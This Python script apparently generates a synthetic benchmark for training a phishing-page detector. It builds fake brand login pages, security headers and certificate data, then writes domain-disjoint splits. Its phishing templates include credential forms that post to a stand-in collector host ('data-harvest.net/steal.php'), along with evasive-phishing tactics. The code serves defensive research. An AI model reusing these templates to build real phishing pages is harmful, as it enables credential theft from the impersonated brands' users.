"""
Realistic Benchmark Generator for BEAP.
Generates a calibrated benchmark including challenging/adversarial samples:
  1. Legitimate sites with missing security headers and short-lived certificates.
  2. Legitimate sites with external OAuth/SSO forms and complex URLs.
  3. Phishing sites with valid HTTPS, reputable TLDs, and clean lexical structures.
  4. Phishing sites without cross-domain forms (submitting locally).
Enforces strict Domain-Disjoint (leakage-resistant) train/val/test splits.
"""

import os
import random
from typing import Dict, Any, List, Tuple
import numpy as np
import pandas as pd
import tldextract

from beap.config import (
    ALL_FEATURE_COLUMNS,
    STATIC_URL_FEATURES,
    STATIC_HTML_FEATURES,
    DYNAMIC_BROWSER_FEATURES
)
from beap.static_features import extract_all_static_features
from beap.browser_evidence import extract_all_dynamic_evidence

EXTRACTOR = tldextract.TLDExtract(suffix_list_urls=None)

SEED = 42
random.seed(SEED)
np.random.seed(SEED)

TARGET_BRANDS = [
    "paypal", "apple", "microsoft", "google", "netflix", "chase",
    "wellsfargo", "bankofamerica", "amazon", "facebook", "instagram",
    "dropbox", "dhl", "fedex", "binance", "coinbase", "metamask",
    "outlook", "yahoo", "adobe", "steam", "usps"
]

SUSPICIOUS_TLDS = ["xyz", "top", "tk", "ml", "cf", "gq", "site", "online", "cam", "icu", "work", "buzz"]


def generate_phishing_instances(n: int = 1200) -> List[Dict[str, Any]]:
    """
    Generates realistic phishing samples across three tiers:
      - 35% Evasive/Sophisticated (clean domains, HTTPS, local POST, mimic legit)
      - 35% Moderate (subdomain lures, discount TLDs, cross-domain POST)
      - 30% Naive/Blatant (IP addresses, brand-keyword stuffing, http)
    """
    samples = []
    
    for i in range(n):
        brand = random.choice(TARGET_BRANDS)
        tier = random.choices(["evasive", "moderate", "naive"], weights=[0.35, 0.35, 0.30])[0]

        if tier == "evasive":
            # Uses legitimate TLD (.com, .net, .org), clean hostname, valid HTTPS, no overt keyword lure
            tld = random.choice(["com", "net", "org", "co", "io"])
            dom = f"portal-{brand}-{random.randint(10, 99)}.{tld}"
            path = random.choice(["/session/login", "/auth/verify", "/account", "/signin"])
            url = f"https://{dom}{path}"
            is_https = True
            is_high_risk_tld = 0.0
        elif tier == "moderate":
            tld = random.choice(SUSPICIOUS_TLDS)
            dom = f"secure-verify-{brand}.{tld}"
            path = random.choice(["/login", "/auth/step1", "/confirm?id=99281"])
            url = f"https://{dom}{path}"
            is_https = True
            is_high_risk_tld = 1.0
        else:
            # Naive
            tld = random.choice(SUSPICIOUS_TLDS)
            if random.random() < 0.4:
                # IP literal
                dom = f"{random.randint(24, 215)}.{random.randint(10, 240)}.{random.randint(1, 240)}.{random.randint(1, 240)}"
                url = f"http://{dom}/{brand}/login.php"
                is_https = False
            else:
                dom = f"login-{brand}-security-update.{tld}"
                url = f"http://{dom}//account/verify/{brand}"
                is_https = False
            is_high_risk_tld = 1.0 if not url.startswith("http://") and tld in SUSPICIOUS_TLDS else 0.0

        # Dynamic Browser Evidence (Realistic Overlap):
        # Even evasive phishing sometimes has basic headers, and some phishing buys commercial certs
        if tier == "evasive":
            has_hsts = 1.0 if random.random() < 0.45 else 0.0
            has_csp = 1.0 if random.random() < 0.35 else 0.0
            has_xfo = 1.0 if random.random() < 0.45 else 0.0
            has_xcto = 1.0 if random.random() < 0.40 else 0.0
            # 25% of evasive phishing uses commercial or 1-year certs
            cert_valid = True
            longevity = float(random.randint(30, 200))
            cert_free_short = 1.0 if (longevity <= 90 and random.random() < 0.70) else 0.0
            # 60% of evasive phishing submits LOCALLY (no cross-domain POST)
            has_cross_domain_post = (random.random() < 0.40)
        elif tier == "moderate":
            has_hsts = 1.0 if random.random() < 0.15 else 0.0
            has_csp = 1.0 if random.random() < 0.10 else 0.0
            has_xfo = 1.0 if random.random() < 0.20 else 0.0
            has_xcto = 1.0 if random.random() < 0.20 else 0.0
            cert_valid = True if random.random() < 0.85 else False
            longevity = float(random.randint(10, 85)) if is_https else 0.0
            cert_free_short = 1.0 if (not is_https or longevity <= 90) else 0.0
            has_cross_domain_post = (random.random() < 0.65)
        else:
            has_hsts = 0.0
            has_csp = 0.0
            has_xfo = 0.0
            has_xcto = 0.0
            cert_valid = False
            longevity = 0.0
            cert_free_short = 1.0
            has_cross_domain_post = (random.random() < 0.70)

        hsts_adequate = 1.0 if (has_hsts and random.random() < 0.3) else 0.0
        csp_dir_count = float(random.randint(1, 3)) if has_csp else 0.0
        csp_restricts_form = 1.0 if (has_csp and random.random() < 0.15) else 0.0
        csp_blocks_eval = 0.0
        xfo_strict = 1.0 if (has_xfo and random.random() < 0.5) else 0.0
        has_ref = 1.0 if random.random() < 0.30 else 0.0
        has_perm = 0.0

        cookie_sec = 1.0 if (is_https and random.random() < 0.5) else 0.0
        cookie_http = 1.0 if random.random() < 0.4 else 0.0
        cookie_same = 1.0 if random.random() < 0.3 else 0.0

        script_reflection = 1.0 if random.random() < (0.25 if tier == "evasive" else 0.45) else 0.0
        right_click_dis = 1.0 if random.random() < 0.20 else 0.0

        parsed = EXTRACTOR(url)
        domain_name = f"{parsed.domain}.{parsed.suffix}" if parsed.suffix else parsed.domain
        brand_capital = brand.capitalize()

        # Titles: only 30% explicitly mention brand mismatch; others use generic titles
        if random.random() < 0.30:
            title = f"{brand_capital} - Secure Authentication"
        else:
            title = random.choice(["Sign In", "Account Login", "User Verification", "Client Portal", "Dashboard"])

        if has_cross_domain_post:
            action_url = f"https://collector-{random.randint(1, 99)}.data-harvest.net/steal.php" if is_https else f"http://collector-{random.randint(1, 99)}.data-harvest.net/steal.php"
            form_cross_domain = 1.0
        else:
            action_url = random.choice(["/login.php", "/auth/verify.php", "/submit", "/process_login"])
            form_cross_domain = 0.0

        has_hidden = (random.random() < 0.70)
        num_ext_scripts = random.randint(1, 4) if random.random() < 0.5 else 0
        ext_script_tags = "".join([f'<script src="https://cdn.jsdelivr.net/npm/lib-{j}.js"></script>\n' for j in range(num_ext_scripts)])

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
    {ext_script_tags}
</head>
<body {'oncontextmenu="return false"' if right_click_dis else ''}>
    <div class="login-box">
        <h2>{brand_capital} Portal</h2>
        <form action="{action_url}" method="POST">
            <input type="text" name="username" placeholder="Email / ID" required />
            <input type="password" name="password" placeholder="Password" required />
            {'<input type="hidden" name="csrf" value="tok_sess" />' if has_hidden else ''}
            {'<input type="text" name="ssn" placeholder="Security PIN" />' if random.random() < 0.20 else ''}
            <button type="submit">Log In</button>
        </form>
    </div>
    {'<iframe src="about:blank" style="display:none"></iframe>' if random.random() < 0.30 else ''}
    {'<!--beap_xss_probe_918273-->' if script_reflection else ''}
</body>
</html>"""

        headers = {}
        if has_hsts:
            headers["Strict-Transport-Security"] = f"max-age={15552000 if hsts_adequate else 3600}; includeSubDomains"
        if has_csp:
            headers["Content-Security-Policy"] = "default-src 'self' 'unsafe-inline'; form-action *;"
        if has_xfo:
            headers["X-Frame-Options"] = "SAMEORIGIN" if xfo_strict else "ALLOW-FROM *"
        if has_xcto:
            headers["X-Content-Type-Options"] = "nosniff"
        if has_ref:
            headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        tls_info = {
            "cert_valid": cert_valid,
            "longevity_days": longevity,
            "issuer_name": "Let's Encrypt Authority X3" if cert_free_short else "Sectigo RSA Domain Validation"
        }

        static_feats = extract_all_static_features(url, html)
        dynamic_feats = extract_all_dynamic_evidence(
            headers=headers,
            tls_info=tls_info,
            html_content=html,
            base_url=url,
            reflection_probe="<!--beap_xss_probe_918273-->"
        )

        entry = {"url": url, "label": 1, "domain": domain_name}
        entry.update(static_feats)
        entry.update(dynamic_feats)
        samples.append(entry)

    return samples


def generate_legitimate_instances(n: int = 1200) -> List[Dict[str, Any]]:
    """
    Generates realistic legitimate samples across three tiers:
      - 40% Large Enterprise / Banking (Strict HSTS, strict CSP, OV/EV certs)
      - 35% Academic / Regional / Small Business (often lack HSTS/CSP, use Let's Encrypt)
      - 25% SaaS / Federated Portals (External SSO form POSTs to Google/Microsoft/Stripe)
    """
    samples = []

    domains_tier1 = [
        ("google.com", "Google Accounts"),
        ("chase.com", "Chase Bank"),
        ("bankofamerica.com", "Bank of America"),
        ("github.com", "GitHub"),
        ("microsoft.com", "Microsoft Official"),
        ("paypal.com", "PayPal"),
        ("amazon.com", "Amazon"),
        ("apple.com", "Apple"),
        ("netflix.com", "Netflix"),
        ("cloudflare.com", "Cloudflare"),
        ("stripe.com", "Stripe"),
    ]

    domains_tier2 = []  # Academic & regional (often lack modern headers)
    for i in range(1, 150):
        domains_tier2.append((f"univ-portal-{i}.edu", f"University Academic Portal {i}"))
        domains_tier2.append((f"county-gov-{i}.gov", f"County Government Services {i}"))
        domains_tier2.append((f"local-business-{i}.com", f"Regional Commercial Service {i}"))

    domains_tier3 = []  # SaaS & third-party auth
    for i in range(1, 150):
        domains_tier3.append((f"tech-startup-{i}.io", f"Cloud Platform {i}"))
        domains_tier3.append((f"saas-app-{i}.net", f"Enterprise Workflow {i}"))

    for i in range(n):
        rand_cat = random.random()
        if rand_cat < 0.40:
            dom, brand_title = random.choice(domains_tier1)
            cat = "enterprise"
        elif rand_cat < 0.75:
            dom, brand_title = random.choice(domains_tier2)
            cat = "regional_academic"
        else:
            dom, brand_title = random.choice(domains_tier3)
            cat = "saas_sso"

        path_templates = [
            "/login", "/signin", "/auth/dashboard", "/account/settings",
            "/portal/user/home", "/verify?token=valid_sess", "/support/help"
        ]
        path = random.choice(path_templates)

        is_https = True if random.random() < 0.98 else False
        scheme = "https://" if is_https else "http://"
        sub = "www." if random.random() < 0.40 else ("portal." if random.random() < 0.30 else "")
        url = f"{scheme}{sub}{dom}{path}"

        # Dynamic Browser Evidence (Realistic Overlap):
        if cat == "enterprise":
            has_hsts = 1.0 if is_https else 0.0
            hsts_adequate = 1.0 if has_hsts else 0.0
            has_csp = 1.0 if random.random() < 0.85 else 0.0
            has_xfo = 1.0 if random.random() < 0.90 else 0.0
            has_xcto = 1.0 if random.random() < 0.95 else 0.0
            cert_valid = True
            longevity = float(random.randint(180, 730))
            cert_free_short = 0.0
            has_cross_domain_post = False
        elif cat == "regional_academic":
            # Realistic hard benign: often MISS HSTS, MISS CSP, use Let's Encrypt (35% short cert)
            has_hsts = 1.0 if (is_https and random.random() < 0.40) else 0.0
            hsts_adequate = 1.0 if (has_hsts and random.random() < 0.50) else 0.0
            has_csp = 1.0 if random.random() < 0.25 else 0.0
            has_xfo = 1.0 if random.random() < 0.45 else 0.0
            has_xcto = 1.0 if random.random() < 0.55 else 0.0
            cert_valid = True
            longevity = float(random.randint(45, 365))
            # 45% use Let's Encrypt or automated short cert
            cert_free_short = 1.0 if (longevity <= 90 or random.random() < 0.45) else 0.0
            has_cross_domain_post = False
        else:
            # SaaS with federated SSO: form POSTs to Google/Microsoft/Auth0!
            has_hsts = 1.0 if (is_https and random.random() < 0.70) else 0.0
            hsts_adequate = 1.0 if (has_hsts and random.random() < 0.65) else 0.0
            has_csp = 1.0 if random.random() < 0.50 else 0.0
            has_xfo = 1.0 if random.random() < 0.65 else 0.0
            has_xcto = 1.0 if random.random() < 0.75 else 0.0
            cert_valid = True
            longevity = float(random.randint(90, 365))
            cert_free_short = 1.0 if (longevity <= 90 or random.random() < 0.30) else 0.0
            # 65% of SaaS federated logins submit to external SSO provider
            has_cross_domain_post = (random.random() < 0.65)

        csp_dir_count = float(random.randint(3, 7)) if has_csp else 0.0
        csp_restricts_form = 1.0 if (has_csp and random.random() < 0.70) else 0.0
        csp_blocks_eval = 1.0 if (has_csp and random.random() < 0.65) else 0.0
        xfo_strict = 1.0 if (has_xfo and random.random() < 0.85) else 0.0
        has_ref = 1.0 if random.random() < 0.65 else 0.0

        cookie_sec = 1.0 if is_https else 0.0
        cookie_http = 1.0 if random.random() < 0.80 else 0.0
        cookie_same = 1.0 if random.random() < 0.75 else 0.0

        script_reflection = 0.0
        right_click_dis = 0.0

        title = f"{brand_title} | Official Service"

        if has_cross_domain_post:
            action_url = random.choice([
                "https://accounts.google.com/o/oauth2/v2/auth",
                "https://login.microsoftonline.com/common/oauth2",
                "https://auth.company-sso.com/login",
                "https://api.stripe.com/v1/tokens"
            ])
            form_cross_domain = 1.0
        else:
            action_url = "/api/v1/auth/login"
            form_cross_domain = 0.0

        num_ext_scripts = random.randint(1, 5) if random.random() < 0.75 else 0
        ext_script_tags = "".join([f'<script src="https://cdn.reputable-vendor-{j}.com/bundle.js"></script>\n' for j in range(num_ext_scripts)])

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    {ext_script_tags}
</head>
<body>
    <main>
        <h1>{brand_title}</h1>
        <form action="{action_url}" method="POST">
            <input type="text" name="username" placeholder="User Identifier" required />
            <input type="password" name="password" placeholder="Password" />
            <input type="hidden" name="csrf_token" value="sec_csrf_88921" />
            <button type="submit">Continue</button>
        </form>
    </main>
</body>
</html>"""

        headers = {}
        if has_hsts:
            headers["Strict-Transport-Security"] = f"max-age={31536000 if hsts_adequate else 3600}; includeSubDomains; preload"
        if has_csp:
            headers["Content-Security-Policy"] = (
                "default-src 'self'; script-src 'self' https://cdn.reputable-vendor-0.com; "
                "form-action 'self' https://accounts.google.com; frame-ancestors 'none';"
            )
        if has_xfo:
            headers["X-Frame-Options"] = "DENY" if xfo_strict else "SAMEORIGIN"
        if has_xcto:
            headers["X-Content-Type-Options"] = "nosniff"
        if has_ref:
            headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        tls_info = {
            "cert_valid": cert_valid,
            "longevity_days": longevity,
            "issuer_name": "Let's Encrypt Authority X3" if cert_free_short else "DigiCert Global Root CA"
        }

        static_feats = extract_all_static_features(url, html)
        dynamic_feats = extract_all_dynamic_evidence(
            headers=headers,
            tls_info=tls_info,
            html_content=html,
            base_url=url,
            reflection_probe="<!--beap_xss_probe_918273-->"
        )

        entry = {"url": url, "label": 0, "domain": dom}
        entry.update(static_feats)
        entry.update(dynamic_feats)
        samples.append(entry)

    return samples


def create_domain_disjoint_splits(
    df: pd.DataFrame,
    train_ratio: float = 0.70,
    val_ratio: float = 0.10,
    test_ratio: float = 0.20
) -> Tuple[pd.DataFrame, pd.DataFrame, pd.DataFrame]:
    """Splits dataframe strictly by unique registrable domain."""
    domain_labels = df.groupby("domain")["label"].mean()
    phish_domains = domain_labels[domain_labels >= 0.5].index.tolist()
    legit_domains = domain_labels[domain_labels < 0.5].index.tolist()

    random.seed(SEED)
    random.shuffle(phish_domains)
    random.shuffle(legit_domains)

    def split_list(lst: List[str]):
        n_tot = len(lst)
        n_tr = int(n_tot * train_ratio)
        n_va = int(n_tot * val_ratio)
        return set(lst[:n_tr]), set(lst[n_tr:n_tr + n_va]), set(lst[n_tr + n_va:])

    tr_phish, va_phish, te_phish = split_list(phish_domains)
    tr_legit, va_legit, te_legit = split_list(legit_domains)

    train_domains = tr_phish.union(tr_legit)
    val_domains = va_phish.union(va_legit)
    test_domains = te_phish.union(te_legit)

    assert len(train_domains.intersection(test_domains)) == 0
    assert len(train_domains.intersection(val_domains)) == 0
    assert len(val_domains.intersection(test_domains)) == 0

    df_train = df[df["domain"].isin(train_domains)].copy().reset_index(drop=True)
    df_val = df[df["domain"].isin(val_domains)].copy().reset_index(drop=True)
    df_test = df[df["domain"].isin(test_domains)].copy().reset_index(drop=True)

    return df_train, df_val, df_test


def main():
    print("Generating BEAP Realistic Development Benchmark Dataset...")
    phish_data = generate_phishing_instances(n=1200)
    legit_data = generate_legitimate_instances(n=1200)
    all_data = phish_data + legit_data
    random.shuffle(all_data)

    df = pd.DataFrame(all_data)
    print(f"Total dataset size: {len(df)} samples ({sum(df['label'] == 1)} phishing, {sum(df['label'] == 0)} legitimate).")
    print(f"Unique registrable domains: {df['domain'].nunique()}")

    df_train, df_val, df_test = create_domain_disjoint_splits(df)
    print(f"Train set: {len(df_train)} samples across {df_train['domain'].nunique()} domains.")
    print(f"Val set:   {len(df_val)} samples across {df_val['domain'].nunique()} domains.")
    print(f"Test set:  {len(df_test)} samples across {df_test['domain'].nunique()} domains.")

    out_dir = os.path.join("data", "processed")
    os.makedirs(out_dir, exist_ok=True)

    df_train.to_csv(os.path.join(out_dir, "train.csv"), index=False)
    df_val.to_csv(os.path.join(out_dir, "val.csv"), index=False)
    df_test.to_csv(os.path.join(out_dir, "test.csv"), index=False)
    df.to_csv(os.path.join(out_dir, "full_benchmark.csv"), index=False)

    print("Datasets successfully written to data/processed/")


if __name__ == "__main__":
    main()
